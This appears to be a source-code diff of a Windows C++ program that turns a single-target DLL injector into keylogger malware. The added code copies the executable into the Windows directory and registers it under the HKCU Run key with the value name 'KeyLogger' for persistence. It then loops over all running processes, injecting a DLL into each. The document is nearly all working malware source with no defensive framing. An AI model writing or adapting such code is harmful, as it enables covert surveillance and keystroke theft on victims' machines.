@@ -5,14 +5,24 @@
 #include <iostream>
 
 bool Inject(DWORD pId, char *dllName);
-using namespace std;
+bool Install(char* injectionDllName);
 
-int main()
+
+int main(int argc, char** argv)
 {
-
+	
 	HANDLE hProcessSnap;
 	PROCESSENTRY32 pe32;
-	char szFilename[] = "notepad++.exe";
+	char szFilename[] = "";
+	char *injectionDllName = "\\InjectionDll.dll";
+	char dllPath[MAX_PATH];
+
+	GetWindowsDirectory(dllPath, MAX_PATH);
+	strcat(dllPath, injectionDllName);
+
+	std::cout << "Install:" << std::endl;
+	if (Install(injectionDllName))
+		std::cout << "success." << std::endl;
 
 	hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
 	if (hProcessSnap == INVALID_HANDLE_VALUE)
@@ -21,20 +31,58 @@ int main()
 	do {
 		if (!Process32Next(hProcessSnap, &pe32))
 		{
-			std::cout << "Can't find Process:"<< szFilename << std::endl;
+			//std::cout << "Can't find Process:"<< szFilename << std::endl;
 			Sleep(10000);
 			return FALSE;
 		}
-		
-	} while (lstrcmpi(pe32.szExeFile, szFilename));
+		if (Inject(pe32.th32ProcessID, dllPath))
+			std::cout << "Injection success:" << pe32.szExeFile << std::endl;
+	} while (/*lstrcmpi(pe32.szExeFile, szFilename)*/true);
 
-	if (Inject(pe32.th32ProcessID, "InjectionDll.dll"))
-	{
-		std::cout << "___OK:" << pe32.szExeFile << std::endl;
-
-	}
-	Sleep(10000);
+	//Sleep(10000);
 	return 0;
+}
+
+bool Install(char* injectionDllName)
+{
+	HKEY hk;
+	char currentPath[MAX_PATH],
+		sysbuf[MAX_PATH],
+		*fileName;
+
+	GetModuleFileName(GetModuleHandle(NULL), currentPath, MAX_PATH);
+	fileName = strrchr(currentPath, '\\');
+	GetWindowsDirectory(sysbuf, MAX_PATH);
+	strcat(sysbuf, fileName);
+	if (!CopyFile(currentPath, sysbuf, false))
+	{
+		std::cout << "Error: Can't copy file:" << std::endl;
+		std::cout << sysbuf << std::endl;
+		return false;
+	}
+
+	if (ERROR_SUCCESS == RegCreateKey(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", &hk))
+	{
+		RegSetValueEx(hk, "KeyLogger", 0, REG_SZ, (LPBYTE) sysbuf, strlen(sysbuf));
+		RegCloseKey(hk);
+	}
+	else
+	{
+		std::cout << "Error: Can't create RegKey." << std::endl;
+		return false;
+	}
+
+	GetModuleFileName(GetModuleHandle(NULL), currentPath, MAX_PATH);
+	GetWindowsDirectory(sysbuf, MAX_PATH);
+	strcpy(fileName, injectionDllName);
+	strcat(sysbuf, fileName);
+	if (!CopyFile(currentPath, sysbuf, false))
+	{
+		std::cout << "Error: Can't copy file:" << std::endl;
+		std::cout << sysbuf << std::endl;
+		return false;
+	}
+	return true;
 }
 
 bool Inject(DWORD pId, char *dllName)
